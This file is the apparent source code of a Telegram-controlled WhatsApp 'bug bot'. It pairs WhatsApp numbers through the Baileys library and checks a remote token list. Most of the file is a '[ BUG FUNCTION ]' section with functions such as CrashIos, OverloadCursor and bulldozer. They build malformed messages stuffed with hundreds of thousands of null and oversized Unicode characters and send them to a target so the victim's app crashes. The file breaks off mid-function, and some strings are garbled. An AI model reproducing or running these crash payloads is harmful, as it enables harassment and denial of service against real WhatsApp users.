/* Dev Rans
   Base By Rans
*/
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const {
  default: makeWASocket, useMultiFileAuthState,downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto,
  WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header,
} = require("@whiskeysockets/baileys");

const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json";

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
SESSIONS_FILE = "./sessions/active_sessions.json";

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}


async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}


const GITHUB_TOKEN_LIST_URL = 'https://raw.githubusercontent.com/tesfuw67/token.json/main/token.json';

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; 
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Check Database..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid!"));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
      console.log(chalk.red(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
  console.log(chalk.red(`ACCESS ACCEPT ✅`));
  console.log(chalk.blue(`Enjoy using this script`));
};
validateToken(); 
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
//SESSION AGAR BOT TERHUBUNG KE NOMOR WHATSAPP
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const taka = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          taka.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, taka);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          taka.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

{}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `┏━━━━━━━━━━━━━━━━━━━━━━
┃      INFORMATION
┣━━━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : INITIALIZATIONℹ️
┗━━━━━━━━━━━━━━━━━━━━━━`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const taka = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  taka.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION 
┣━━━━━━━━━━━━━━━━━━━━
┃⌬ NUMBER : ${botNumber}
┃⌬ STATUS : RECONNECTING🔄
┗━━━━━━━━━━━━━━━━━━━━`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : FAILED 🔴
┗━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      taka.newsletterFollow("120363402042668210@newsletter"); // AUTO FOLLOW CH
      taka.newsletterFollow("120363387182851100@newsletter");
      taka.newsletterFollow("120363419813999491@newsletter");
      taka.newsletterFollow("120363406105896987@newsletter")
      sessions.set(botNumber, taka);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `┏━━━━━━━━━━━━━━━━━━━━
┃       INFORMATION
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : CONNECTED 🟢
┗━━━━━━━━━━━━━━━━━━━━`, 
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const costum = "VtakaXJMK" // COSTUM PAIR CODE
          const code = await taka.requestPairingCode(botNumber, costum);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ CODE : ${formattedCode}
┗━━━━━━━━━━━━━━━━━━━━━`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `┏━━━━━━━━━━━━━━━━━━━━━
┃      PAIRING SESSION
┣━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ NUMBER : ${botNumber}
┃ ⌬ STATUS : ${error.message}
┗━━━━━━━━━━━━━━━━━━━━━
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  taka.ev.on("creds.update", saveCreds);

  return taka;
}

// [ BUG FUNCTION ]

async function CrashFaridz(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": " You Know Faridz?"
        },
        "header": { 
          "title": '🩸Lari Ada Faridz🩸' + "\u0000".repeat(50000),
          "hasMediaAttachment": false,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "#895 Area Faridz" + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "You Know Faridz?"  },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});
 await client.relayMessage(target, carousel.message, {
messageId: carousel.key.id
});
  }
}

async function CrashIos(abbys, target) {

const msg = generateWAMessageFromContent(target, {
ephemeralMessage: {
 message: {
  extendedTextMessage: {
   text: "饾悅饾悽饾悿饾悹饾惍 饾悩饾悮饾惂饾惂饾悐饾悮饾惓饾悶饾悶" + "覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛鈥贬渾幄?" + "饝噦饝喌饝喆饝喛".repeat(60000),
      matchedText: "https://Wa.me/stickerpack/yann",
        description:
          "覊覉鈨濃優鈨熲儬鈨り櫚隀?" +
         "饝噦饝喌饝喆饝喛".repeat(15000),
             }, 
         quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
           }
         }
       }
     }
  });

await abbys.relayMessage(target, msg.message, {
messageId: msg.key.id
});
}

async function CrashLoadIos(taka, target) {
  const LocationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/rizxvelzdev",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await taka.relayMessage(target, LocationMessage, {
    participant: { jid: target }
  });
  console.log(randomColor()(`─────「 ⏤!CrashIOS To: ${target}!⏤ 」─────`))
}

async function OverloadCursor(taka, target) {
    const virtex = [{
            attrs: {
                biz_bot: "1"
            },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
    let messagePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RansTech Crasher" + "ꦽ".repeat(16999),
                    listType: 2,
                    singleSelectReply: {
                        selectedRowId: "😹",
                    },
                    contextInfo: {
                        virtexId: taka.generateMessageTag(),
                        participant: "13135550002@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Z?" + "\u0000".repeat(97770),
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: tdxlol,
                                },
                                hasMediaAttachment: true,
                                contentText: 'XZCRASHER"👋"',
                                footerText: "|| VCS BY XRans ꦽ",
                                buttons: [{
                                        buttonId: "\u0000".repeat(170000),
                                        buttonText: {
                                            displayText: "Ampas?" + "{".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "{".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "{".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                ],
                                viewOnce: true,
                                headerType: 3,
                            },
                        },
                        conversionSource: "porn",
                        conversionData: crypto.randomBytes(16),
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            jpegThumbnail: tdxlol,
                            caption: " x ",
                        },
                        placeholderKey: {
                            remoteJid: "13135550002@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890",
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: crypto.randomBytes(16),
                        entryPointConversionSource: "❤️",
                        entryPointConversionApp: "💛",
                        actionLink: {
                            url: "https://t.me/ranstamvan1",
                            buttonTitle: "Ampas",
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true,
                        },
                        groupSubject: "😼",
                        parentGroupJid: "😽",
                        trustBannerType: "😾",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {},
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363274419384848@newsletter",
                            serverMessageId: 1,
                            newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: "kontol",
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2",
                        },
                    },
                    description: "@13135550002".repeat(2999),
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16),
                    }),
                },
            },
        },
    };
    let sections = [];
    for (let i = 0; i < 1; i++) {
        let largeText = "\u0000".repeat(11999);
        let deepNested = {
            title: `Section ${i + 1}`,
            highlight_label: `Highlight ${i + 1}`,
            rows: [{
                title: largeText,
                id: `\u0000`.repeat(999),
                subrows: [{
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                        subsubrows: [{
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                            {
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                        ],
                    },
                    {
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                    },
                ],
            }, ],
        };
        sections.push(deepNested);
    }
    let listMessage = {
        title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
        sections: sections,
    };
    let msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '⿻ᬃR͜͡Ä⃪᪳͢͡N⃪᪴͢͡Ṣ󠀭 Ͳ͢Ξ⃪͜Ꮯ⃪᪶᷍Ꮋ͢͠⿻' + "{{".repeat(29999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "rans crash" + "\u0000".repeat(9999),
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "call_permission_request",
                                   buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{".repeat(10000),
                                },
                            ],
                        }),
                    }),
                },
            },
        }), {
            userJid: target
        }
    );
    await taka.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 ${target}`);
    await taka.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    await taka.relayMessage(target, messagePayload, {
        additionalNodes: virtex,
        participant: {
            jid: target
        },
    });
    console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙲𝚄𝚁𝚂𝙾𝚁 𝚃𝙾 ${target}`);
}

async function bulldozer(taka, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
